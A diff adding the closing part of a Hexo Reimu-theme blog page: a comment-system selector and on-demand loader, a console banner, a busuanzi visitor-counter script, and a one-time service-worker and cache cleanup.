+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'utterances';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false,
+      utterances: false,
+      beaudar: false,
+      disqus: false,
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    Promise.all([
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        return Promise.all(registrations.map((registration) => registration.unregister()));
+      }),
+      ('caches' in window)
+        ? caches.keys().then((keys) => Promise.all(keys.map((key) => caches.delete(key))))
+        : Promise.resolve()
+    ]).then(() => {
+      if (!sessionStorage.getItem('sw-cache-cleared')) {
+        sessionStorage.setItem('sw-cache-cleared', '1');
+        window.location.reload();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
